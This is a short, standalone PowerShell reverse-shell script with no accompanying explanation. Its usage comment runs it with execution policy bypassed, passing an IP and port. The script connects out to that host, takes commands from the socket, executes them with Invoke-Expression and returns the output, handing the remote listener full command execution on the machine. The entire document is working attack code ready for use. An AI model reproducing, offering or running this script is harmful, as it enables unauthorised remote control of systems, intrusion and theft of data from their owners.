# powershell -ExecutionPolicy Bypass -File .\ps_rv.ps1 -TargetIP "10.6.36.88" -TargetPort 4444

param (
    [Parameter(Mandatory=$true)]
    [string]$TargetIP,

    [Parameter(Mandatory=$true)]
    [int]$TargetPort
)

$callback = New-Object System.Net.Sockets.TCPClient($TargetIP, $TargetPort)
$stream = $callback.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$callback.Close()
